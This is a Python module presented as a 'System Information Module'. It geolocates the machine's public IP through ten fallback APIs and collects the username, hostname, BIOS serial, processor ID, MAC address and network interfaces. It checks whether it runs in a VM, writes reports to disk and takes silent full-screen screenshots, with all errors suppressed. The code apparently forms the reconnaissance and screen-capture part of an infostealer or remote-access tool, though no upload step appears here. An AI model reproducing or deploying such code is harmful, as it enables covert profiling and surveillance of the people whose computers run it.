# System Information Module
# Features: 10 IP APIs, 100 requests/day limit, VMware/VirtualBox support

import requests
import platform
import socket
import getpass
import psutil
import json
import os
import uuid
import wmi
import subprocess
from datetime import datetime
from contextlib import suppress
from PIL import ImageGrab

# IP Geolocation APIs - 10 different services for redundancy
IP_APIS = [
    {"url": "https://ipwhois.app/json/", "name": "IPWhois", "daily_limit": 100},
    {"url": "https://ipapi.co/json/", "name": "IPApi", "daily_limit": 100},
    {"url": "https://ipinfo.io/json", "name": "IPInfo", "daily_limit": 100},
    {"url": "https://api.ipify.org?format=json", "name": "IPify", "daily_limit": 100},
    {"url": "https://api.myip.com", "name": "MyIP", "daily_limit": 100},
    {"url": "https://api.ipregistry.co/?key=demo", "name": "IPRegistry", "daily_limit": 100},
    {"url": "https://ipgeolocation.abstractapi.com/v1/?api_key=demo", "name": "Abstract", "daily_limit": 100},
    {"url": "https://api.ipbase.com/v1/json/", "name": "IPBase", "daily_limit": 100},
    {"url": "https://ipapi.com/ip_api.php?ip=check", "name": "IPApiCom", "daily_limit": 100},
    {"url": "https://api.db-ip.com/v2/free/self", "name": "DB-IP", "daily_limit": 100}
]

class RequestLimiter:
    """Rate limiter for API requests - 100 per day per API"""
    def __init__(self, storage_dir=None):
        if storage_dir is None:
            storage_dir = os.path.join(os.environ.get('TEMP', '/tmp'), 'tmpdb_data')
        self.storage_file = os.path.join(storage_dir, 'api_requests.json')
        self.daily_limit = 100  # 100 requests per day per API
        self._ensure_storage()
    
    def _ensure_storage(self):
        """Ensure storage directory and file exist"""
        try:
            os.makedirs(os.path.dirname(self.storage_file), exist_ok=True)
            if not os.path.exists(self.storage_file):
                self._save_data({})
        except:
            pass
    
    def _load_data(self):
        """Load request tracking data"""
        try:
            if os.path.exists(self.storage_file):
                with open(self.storage_file, 'r') as f:
                    return json.load(f)
        except:
            pass
        return {}
    
    def _save_data(self, data):
        """Save request tracking data"""
        try:
            with open(self.storage_file, 'w') as f:
                json.dump(data, f)
        except:
            pass
    
    def can_make_request(self, api_name):
        """Check if we can make a request to this API today"""
        data = self._load_data()
        today = datetime.now().strftime('%Y-%m-%d')
        
        if api_name not in data:
            data[api_name] = {"date": today, "count": 0}
        
        # Reset if new day
        if data[api_name].get("date") != today:
            data[api_name] = {"date": today, "count": 0}
        
        return data[api_name]["count"] < self.daily_limit
    
    def record_request(self, api_name):
        """Record that we made a request"""
        data = self._load_data()
        today = datetime.now().strftime('%Y-%m-%d')
        
        if api_name not in data or data[api_name].get("date") != today:
            data[api_name] = {"date": today, "count": 0}
        
        data[api_name]["count"] += 1
        self._save_data(data)
    
    def get_remaining(self, api_name):
        """Get remaining requests for today"""
        data = self._load_data()
        today = datetime.now().strftime('%Y-%m-%d')
        
        if api_name not in data or data[api_name].get("date") != today:
            return self.daily_limit
        
        return max(0, self.daily_limit - data[api_name]["count"])


# Global limiter instance
_limiter = None

def get_limiter():
    """Get or create global request limiter"""
    global _limiter
    if _limiter is None:
        _limiter = RequestLimiter()
    return _limiter


def get_public_ip_info(max_retries=3):
    """Get public IP with 10 API fallback system and 100 req/day limit"""
    limiter = get_limiter()
    collected_data = {}
    
    for api_config in IP_APIS:
        api_name = api_config["name"]
        api_url = api_config["url"]
        
        # Check rate limit
        if not limiter.can_make_request(api_name):
            continue
        
        for attempt in range(max_retries):
            try:
                response = requests.get(api_url, timeout=5)
                if response.status_code == 200:
                    data = response.json()
                    
                    # Record successful request
                    limiter.record_request(api_name)
                    
                    # Extract IP
                    public_ip = data.get('ip') or data.get('ip_address') or data.get('query')
                    
                    if public_ip:
                        collected_data = {
                            'ip': public_ip,
                            'country': data.get('country') or data.get('country_name') or data.get('countryCode'),
                            'country_code': data.get('country_code') or data.get('countryCode') or data.get('country'),
                            'city': data.get('city'),
                            'region': data.get('region') or data.get('regionName'),
                            'isp': data.get('isp') or data.get('org') or data.get('asn'),
                            'latitude': data.get('latitude') or data.get('lat'),
                            'longitude': data.get('longitude') or data.get('lon'),
                            'api_source': api_name,
                            'requests_remaining': limiter.get_remaining(api_name)
                        }
                        return collected_data
                        
            except Exception as e:
                if attempt < max_retries - 1:
                    continue
    
    return collected_data


def get_default_gateway():
    """Get the default gateway IP - 100% reliable in VMs"""
    gateway = None
    
    # Method 1: ipconfig
    try:
        result = subprocess.run(['ipconfig'], capture_output=True, text=True, timeout=5)
        lines = result.stdout.split('\\n')
        for i, line in enumerate(lines):
            if 'Default Gateway' in line:
                parts = line.split(':')
                if len(parts) >= 2:
                    ip = parts[-1].strip().split()[0]
                    if _is_valid_ipv4(ip):
                        gateway = ip
                        break
                if i + 1 < len(lines):
                    next_line = lines[i + 1].strip()
                    if _is_valid_ipv4(next_line.split()[0] if ' ' in next_line else next_line):
                        gateway = next_line.split()[0] if ' ' in next_line else next_line
                        break
    except:
        pass
    
    # Method 2: WMI
    if not gateway:
        try:
            c = wmi.WMI()
            for nic in c.Win32_NetworkAdapterConfiguration(IPEnabled=True):
                if nic.DefaultIPGateway:
                    for g in nic.DefaultIPGateway:
                        if _is_valid_ipv4(g):
                            gateway = g
                            break
                if gateway:
                    break
        except:
            pass
    
    # Method 3: route print
    if not gateway:
        try:
            result = subprocess.run(['route', 'print'], capture_output=True, text=True, timeout=3)
            for line in result.stdout.split('\\n'):
                if line.strip().startswith('0.0.0.0'):
                    parts = line.split()
                    if len(parts) >= 3 and _is_valid_ipv4(parts[2]):
                        gateway = parts[2]
                        break
        except:
            pass
    
    return gateway


def _is_valid_ipv4(ip):
    """Validate IPv4 address"""
    if not ip or not isinstance(ip, str):
        return False
    ip = ip.strip()
    invalid = ['/', 'fe80', '::', 'On-link', 'Default', '255.255.255']
    for p in invalid:
        if p in ip:
            return False
    if ip.count('.') != 3:
        return False
    parts = ip.split('.')
    if len(parts) != 4:
        return False
    for part in parts:
        if not part.isdigit() or not 0 <= int(part) <= 255:
            return False
    return ip not in ['0.0.0.0', '255.255.255.255']


def get_all_network_interfaces():
    """Get all network interfaces including VMware/virtual"""
    interfaces = {}
    
    try:
        net_addrs = psutil.net_if_addrs()
        net_stats = psutil.net_if_stats()
        
        for iface_name, addrs in net_addrs.items():
            iface_info = {
                'name': iface_name,
                'ipv4': [],
                'ipv6': [],
                'mac': None,
                'is_up': False,
                'speed': 0,
                'mtu': 0
            }
            
            if iface_name in net_stats:
                stats = net_stats[iface_name]
                iface_info['is_up'] = stats.isup
                iface_info['speed'] = stats.speed
                iface_info['mtu'] = stats.mtu
            
            for addr in addrs:
                if addr.family == socket.AF_INET:
                    iface_info['ipv4'].append({
                        'address': addr.address,
                        'netmask': addr.netmask,
                        'broadcast': addr.broadcast
                    })
                elif addr.family == socket.AF_INET6:
                    iface_info['ipv6'].append({
                        'address': addr.address,
                        'netmask': addr.netmask
                    })
                elif hasattr(psutil, 'AF_LINK') and addr.family == psutil.AF_LINK:
                    iface_info['mac'] = addr.address
            
            interfaces[iface_name] = iface_info
    except:
        pass
    
    return interfaces


def get_system_info(output_dir):
    """Gather comprehensive system information"""
    os.makedirs(output_dir, exist_ok=True)
    
    # Get gateway and network info
    default_gateway = get_default_gateway()
    all_interfaces = get_all_network_interfaces()
    public_ip_data = get_public_ip_info()
    
    # Find primary interface
    primary_interface = None
    primary_ip = None
    
    for name, info in all_interfaces.items():
        if 'loopback' in name.lower() or name.lower() in ['lo', 'localhost']:
            continue
        if info.get('ipv4'):
            for ip_info in info['ipv4']:
                ip = ip_info['address']
                if default_gateway and ip:
                    gw_parts = default_gateway.split('.')
                    ip_parts = ip.split('.')
                    if len(gw_parts) == 4 and len(ip_parts) == 4:
                        if gw_parts[:3] == ip_parts[:3]:
                            primary_interface = name
                            primary_ip = ip
                            break
        if primary_interface:
            break
    
    if not primary_ip:
        for name, info in all_interfaces.items():
            if 'loopback' not in name.lower() and info.get('ipv4'):
                primary_interface = name
                primary_ip = info['ipv4'][0]['address']
                break
    
    # System specs
    try:
        cpu_count = psutil.cpu_count(logical=True)
        cpu_freq = psutil.cpu_freq()
        ram = psutil.virtual_memory()
        disk = psutil.disk_usage('/')
        boot_time = datetime.fromtimestamp(psutil.boot_time()).strftime("%Y-%m-%d %H:%M:%S")
        
        # Build interface text
        interface_text = ""
        for name, info in all_interfaces.items():
            interface_text += f"\\n    [{name}]\\n"
            interface_text += f"      Status: {'UP' if info.get('is_up') else 'DOWN'}\\n"
            if info.get('mac'):
                interface_text += f"      MAC: {info['mac']}\\n"
            for i, ipv4 in enumerate(info.get('ipv4', [])):
                interface_text += f"      IPv4 #{i+1}: {ipv4.get('address', 'N/A')}"
                if ipv4.get('netmask'):
                    interface_text += f" / {ipv4['netmask']}"
                interface_text += "\\n"
        
        # MAC address
        mac = ':'.join(['{:02x}'.format((uuid.getnode() >> e) & 0xff) 
                       for e in range(0, 2*6, 8)][::-1])
        
        # Windows info via WMI
        windows_info = {}
        try:
            c = wmi.WMI()
            system = c.Win32_ComputerSystem()[0]
            os_info = c.Win32_OperatingSystem()[0]
            bios = c.Win32_BIOS()[0]
            processor = c.Win32_Processor()[0]
            
            windows_info = {
                'manufacturer': system.Manufacturer,
                'model': system.Model,
                'system_type': system.SystemType,
                'total_physical_memory_gb': round(int(system.TotalPhysicalMemory) / (1024**3), 2),
                'os_caption': os_info.Caption,
                'os_version': os_info.Version,
                'bios_version': bios.Version,
                'bios_serial': bios.SerialNumber,
                'processor_id': processor.ProcessorId,
                'processor_name': processor.Name,
                'processor_cores': processor.NumberOfCores,
                'processor_threads': processor.NumberOfLogicalProcessors
            }
        except:
            pass
        
        # Build report
        system_infos = f"""
╔══════════════════════════════════════════════════════════════════════════════╗
║                    COMPREHENSIVE SYSTEM REPORT (VM-AWARE)                    ║
╚══════════════════════════════════════════════════════════════════════════════╝

[+] TIMESTAMP
    Generated: {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}
    Boot Time: {boot_time}

[+] NETWORK CONFIGURATION
    Default Gateway : {default_gateway or 'NOT DETECTED'}
    Primary IP      : {primary_ip or 'N/A'}
    Primary Interface: {primary_interface or 'N/A'}
    Public IP       : {public_ip_data.get('ip', 'Unknown')}
    Country         : {public_ip_data.get('country', 'Unknown')} ({public_ip_data.get('country_code', 'XX')})
    City            : {public_ip_data.get('city', 'Unknown')}
    ISP             : {public_ip_data.get('isp', 'Unknown')}
    API Source      : {public_ip_data.get('api_source', 'N/A')}
    API Remaining   : {public_ip_data.get('requests_remaining', 'N/A')} requests today

[+] ALL NETWORK INTERFACES
{interface_text}

[+] USER INFORMATION
    - Hostname      : {socket.gethostname()}
    - Username      : {getpass.getuser()}
    - User Domain   : {os.environ.get('USERDOMAIN', 'N/A')}
    - User Profile  : {os.environ.get('USERPROFILE', 'N/A')}

[+] HARDWARE INFORMATION
    - Processor     : {platform.processor()}
    - CPU Cores     : {cpu_count}
    - CPU Frequency : {cpu_freq.current if cpu_freq else 'N/A'} MHz
    - Machine       : {platform.machine()}
    - MAC Address   : {mac}
    
[+] MEMORY INFORMATION
    - Total RAM     : {round(ram.total / (1024**3), 2)} GB
    - Used RAM      : {round(ram.used / (1024**3), 2)} GB ({ram.percent}%)
    - Available RAM : {round(ram.available / (1024**3), 2)} GB
    
[+] STORAGE INFORMATION
    - Total Disk    : {round(disk.total / (1024**3), 2)} GB
    - Used Disk     : {round(disk.used / (1024**3), 2)} GB ({disk.percent}%)
    - Free Disk     : {round(disk.free / (1024**3), 2)} GB

[+] OPERATING SYSTEM
    - Platform      : {platform.platform()}
    - System        : {platform.system()}
    - Release       : {platform.release()}
    - Version       : {platform.version()}
    - Architecture  : {platform.architecture()[0]}

[+] WINDOWS SPECIFIC INFORMATION
{chr(10).join([f"    - {k:25}: {v}" for k, v in windows_info.items()]) if windows_info else "    N/A"}

[+] VM DETECTION
    - Is VM         : {'Yes' if any(x in platform.platform().lower() for x in ['vmware', 'virtualbox', 'hyper-v', 'kvm', 'xen']) else 'Unknown'}
    - Platform Hints: {platform.platform()}
"""
        
        # Save text report
        with open(os.path.join(output_dir, "system_infos.txt"), "w", encoding="utf-8") as f:
            f.write(system_infos)
        
        # Save JSON
        json_data = {
            "timestamp": datetime.now().isoformat(),
            "network": {
                "default_gateway": default_gateway,
                "primary_ip": primary_ip,
                "primary_interface": primary_interface,
                "public_ip_info": public_ip_data,
                "all_interfaces": all_interfaces
            },
            "user": {
                "hostname": socket.gethostname(),
                "username": getpass.getuser(),
                "domain": os.environ.get('USERDOMAIN', ''),
                "profile": os.environ.get('USERPROFILE', '')
            },
            "hardware": {
                "processor": platform.processor(),
                "cpu_cores": cpu_count,
                "cpu_frequency_mhz": cpu_freq.current if cpu_freq else None,
                "machine": platform.machine(),
                "mac_address": mac
            },
            "memory": {
                "total_gb": round(ram.total / (1024**3), 2),
                "used_gb": round(ram.used / (1024**3), 2),
                "available_gb": round(ram.available / (1024**3), 2),
                "percent_used": ram.percent
            },
            "storage": {
                "total_gb": round(disk.total / (1024**3), 2),
                "used_gb": round(disk.used / (1024**3), 2),
                "free_gb": round(disk.free / (1024**3), 2),
                "percent_used": disk.percent
            },
            "operating_system": {
                "platform": platform.platform(),
                "system": platform.system(),
                "release": platform.release(),
                "version": platform.version(),
                "architecture": platform.architecture()[0]
            },
            "windows_info": windows_info,
            "api_usage": {
                "limit_per_day": 100,
                "apis_available": len(IP_APIS),
                "apis_used_today": {api["name"]: 100 - get_limiter().get_remaining(api["name"]) for api in IP_APIS}
            }
        }
        
        with open(os.path.join(output_dir, "system_infos.json"), "w", encoding="utf-8") as f:
            json.dump(json_data, f, indent=2, ensure_ascii=False)
        
        return json_data
        
    except Exception as e:
        error_msg = f"Error gathering system info: {str(e)}"
        with open(os.path.join(output_dir, "system_infos.txt"), "w") as f:
            f.write(error_msg)
        return {"error": str(e)}


def capture(output_dir, filename="screenshoted.jpg"):
    """Take screenshot and save"""
    try:
        os.makedirs(output_dir, exist_ok=True)
        screenshot = ImageGrab.grab()
        path = os.path.join(output_dir, filename)
        screenshot.save(path, "JPEG", quality=100)
        return path
    except:
        return None